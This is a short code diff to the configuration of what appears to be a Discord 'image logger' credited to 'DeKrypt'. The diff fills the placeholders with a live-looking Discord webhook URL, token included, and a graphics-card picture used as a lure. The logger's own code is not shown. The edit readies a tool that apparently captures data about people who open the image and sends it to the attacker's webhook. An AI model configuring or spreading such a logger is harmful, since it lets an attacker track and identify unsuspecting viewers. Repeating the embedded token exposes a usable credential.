@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1445125379131183186/b6P32ynwTvVin0qqg34FL4DctAxSwop4vK75Wh_vzqUlB16TJEvSFLJkQcK-eX9jl7gE",
+    "image": "https://e7.pngegg.com/pngimages/926/414/png-clipart-graphics-cards-video-adapters-rgb-backlit-gaming-high-end-graphics-card-geforce-gtx-1080ti-lightning-z-nvidia-geforce-gtx-1080-ti-founders-edition-lockers-electronic-device-geforce.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
